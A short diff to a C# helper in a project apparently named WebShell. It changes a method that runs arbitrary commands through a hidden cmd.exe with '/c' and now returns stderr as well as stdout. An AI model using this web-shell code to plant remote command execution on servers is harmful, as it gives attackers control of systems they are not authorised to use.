@@ -15,8 +15,8 @@ namespace WebShell.Helpers
                 {
                     FileName = "cmd.exe",
                     CreateNoWindow = true,
-                    RedirectStandardInput = true,
-                    RedirectStandardOutput = true
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true
                 }
             };
         }
@@ -25,9 +25,10 @@ namespace WebShell.Helpers
         {
             _cmd.StartInfo.Arguments = $"/c {command}";
             _cmd.StartInfo.WorkingDirectory = Path.GetFullPath(path);
+
             _cmd.Start();
 
-            return _cmd.StandardOutput.ReadToEnd();
+            return _cmd.StandardOutput.ReadToEnd() + _cmd.StandardError.ReadToEnd();
         }
     }
 }
